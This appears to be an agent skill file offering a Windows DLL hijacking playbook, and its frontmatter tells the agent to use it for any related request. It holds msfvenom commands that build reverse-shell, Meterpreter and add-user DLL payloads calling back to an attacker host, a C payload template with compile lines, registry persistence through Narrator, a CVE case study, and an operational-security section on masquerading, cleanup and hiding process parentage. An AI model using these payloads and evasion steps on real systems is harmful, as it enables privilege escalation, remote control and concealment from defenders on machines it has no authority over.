---
name: windows-dll-hijacking
description: Windows DLL hijacking for privilege escalation and code execution. Use this skill whenever the user mentions DLL hijacking, DLL sideloading, DLL search order, phantom DLL, missing DLL exploitation, Windows privilege escalation via DLLs, or any scenario involving manipulating trusted applications to load malicious DLLs. Also trigger for Narrator hijacking, MSI dropper analysis, signed binary abuse, or when investigating DLL-related vulnerabilities on Windows systems.
---

# Windows DLL Hijacking Skill

A comprehensive guide for performing DLL hijacking attacks on Windows systems for privilege escalation and code execution.

## Quick Start

1. **Find missing DLLs** using ProcMon filters
2. **Verify write permissions** on target directories
3. **Create a malicious DLL** with appropriate exports
4. **Deploy and trigger** the hijack

## Finding Missing DLLs

### Using ProcMon (Process Monitor)

The most reliable method to discover DLL hijacking opportunities:

1. Download [ProcMon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) from Sysinternals
2. Apply these filters:
   - `Process Name` → `is` → `<target executable>`
   - `Path` → `ends with` → `.dll`
   - `Result` → `is` → `NAME NOT FOUND`
3. Run the target application and capture events
4. Look for DLLs that the process attempts to load but cannot find

### Automated Discovery Tools

- **WinPEAS**: Checks write permissions on folders in system PATH
- **PowerSploit functions**:
  - `Find-ProcessDLLHijack` - Find processes with missing DLLs
  - `Find-PathDLLHijack` - Find writable paths in DLL search order
  - `Write-HijackDll` - Generate a hijack DLL

## DLL Search Order (Windows)

Understanding the search order is critical for successful hijacking:

1. Directory from which the application loaded
2. System directory (`C:\Windows\System32`)
3. 16-bit system directory (`C:\Windows\System`)
4. Windows directory (`C:\Windows`)
5. Current directory
6. Directories in PATH environment variable

**Important notes:**
- `SafeDllSearchMode` is enabled by default (current directory is #5)
- Known DLLs (in registry) bypass the search
- DLLs loaded with absolute paths cannot be hijacked
- Dependencies are searched by name only, regardless of how the parent was loaded

## Exploitation Scenarios

### Scenario 1: Phantom DLL Hijacking

When a process looks for a DLL that doesn't exist anywhere:

1. Identify the missing DLL name from ProcMon
2. Verify you can write to a directory in the search order
3. Create a DLL with that name
4. Place it in the highest-priority writable directory
5. Trigger the process to load it

### Scenario 2: DLL Replacement

When a DLL exists but you can place a malicious one first:

1. Find a DLL the process loads from a writable location
2. Create a proxy DLL that forwards calls to the real DLL
3. Replace or place your DLL in a higher-priority location
4. Use tools like [DLLirant](https://github.com/redteamsocietegenerale/DLLirant) or [Spartacus](https://github.com/Accenture/Spartacus) for proxying

### Scenario 3: Scheduled Task Hijacking

For processes that run on a schedule:

1. Find a scheduled task/service that loads a missing DLL
2. Place your malicious DLL in the application directory
3. Wait for the task to execute (or trigger it manually)
4. Code executes under the task's context

## Creating Malicious DLLs

### Using Metasploit (Quick Payloads)

```bash
# Reverse shell (x64)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f dll -o payload.dll

# Meterpreter (x86)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f dll -o payload.dll

# Add user (x86)
msfvenom -p windows/adduser USER=<name> PASS=<password> -f dll -o payload.dll
```

### Custom C DLL Template

```c
#include <windows.h>

BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        // Your payload here
        system("whoami > C:\\users\\<user>\\output.txt");
        // Or use WinExec for more control
        // WinExec("calc.exe", SW_HIDE);
    }
    return TRUE;
}
```

**Compilation:**
- x64: `x86_64-w64-mingw32-gcc -shared -o output.dll source.c`
- x86: `i686-w64-mingw32-gcc -shared -o output.dll source.c`

### DLL Proxying

When the target DLL requires specific exports:

1. Use [DLLirant](https://github.com/redteamsocietegenerale/DLLirant) or [Spartacus](https://github.com/Accenture/Spartacus)
2. Specify the target executable and library to proxy
3. The tool generates a DLL that:
   - Executes your payload on load
   - Forwards all required function calls to the real DLL

## Permission Checking

### Check folder permissions

```bash
# Using accesschk
accesschk.exe -dqv "C:\path\to\folder"

# Using icacls
icacls "C:\path\to\folder"
```

### Check all PATH directories

```batch
for %%A in ("%path:;=";"%") do (
    cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :" | findstr /i ":\\ everyone authenticated users todos %username%"
    echo.
)
```

### Check DLL imports/exports

```bash
# Check what a binary imports
dumpbin /imports C:\path\to\binary.exe

# Check what a DLL exports
dumpbin /exports C:\path\to\library.dll
```

## Case Studies

### Narrator OneCore TTS Hijack

Windows Narrator loads a language-specific DLL that can be hijacked:

- **Target path**: `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll`
- **No exports required** - DllMain executes on load
- **Trigger**: Start Narrator (Win+Ctrl+Enter on secure desktop)
- **Privilege**: SYSTEM on secure desktop

**Persistence via registry:**
```bash
# User context
reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f

# SYSTEM context (requires admin)
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f
```

### MSI CustomAction + DLL Side-Loading

Threat actors use MSI droppers to stage signed binaries with malicious DLLs:

1. MSI CustomAction extracts and drops files during installation
2. Signed EXE (e.g., `wsc_proxy.exe`) is placed with malicious DLL (`wsc.dll`)
3. When EXE runs, it loads the DLL from the same directory first
4. Code executes under the signed process's identity

**Analysis steps:**
- Use Orca to inspect CustomAction, InstallExecuteSequence, and Binary tables
- Extract CAB contents: `msiexec /a package.msi /qb TARGETDIR=C:\out`
- Look for VBScript actions that concatenate/decrypt payloads

### Phantom DLL in Scheduled Tasks

Example: Lenovo TPQMAssistant.exe (CVE-2025-1729)

- **Location**: `C:\ProgramData\Lenovo\TPQM\Assistant\`
- **Missing DLL**: `hostfxr.dll`
- **Trigger**: Daily scheduled task at 9:30 AM
- **Write access**: CREATOR OWNER (local users can write)
- **Result**: Code execution under logged-on user context

## Advanced Techniques

### Forcing DLL Search Path via RTL_USER_PROCESS_PARAMETERS

For advanced scenarios, you can manipulate the DLL search path when creating a process:

1. Use `RtlCreateProcessParametersEx` to set custom `DllPath`
2. Create process with `RtlCreateUserProcess`
3. Target binary will resolve DLLs from your specified directory

See the bundled script `force_dllpath.c` for a complete example.

### Bring Your Own Accessibility (BYOA)

Clone an existing Accessibility Tool registry entry:

1. Copy an existing AT entry (e.g., CursorIndicator)
2. Modify to point to your binary/DLL
3. Set `configuration` registry value to your AT name
4. Triggers under Accessibility framework with elevated privileges

## Operational Security

- **Silent execution**: Suspend the target process's main thread before executing payload
- **Cleanup**: Delete temporary files after loading (e.g., encrypted blobs)
- **Masquerading**: Rename signed EXEs to look like Windows binaries (keep OriginalFileName in PE header)
- **Process creation**: Use WMI/CIM to create processes, hiding parent relationship

## References

- [Sysinternals ProcMon](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Microsoft DLL Search Order](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [UACME Project](https://github.com/hfiref0x/UACME)
- [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
- [DLLirant](https://github.com/redteamsocietegenerale/DLLirant)
- [Spartacus](https://github.com/Accenture/Spartacus)

## Scripts

This skill includes helper scripts:

- `check_dll_permissions.sh` - Check write permissions on PATH directories
- `generate_dll_payload.sh` - Generate a basic DLL payload
- `procmon_filter_template.txt` - ProcMon filter configuration
- `force_dllpath.c` - C example for forcing DLL search path

Run these scripts from the `scripts/` directory or reference them in your workflow.
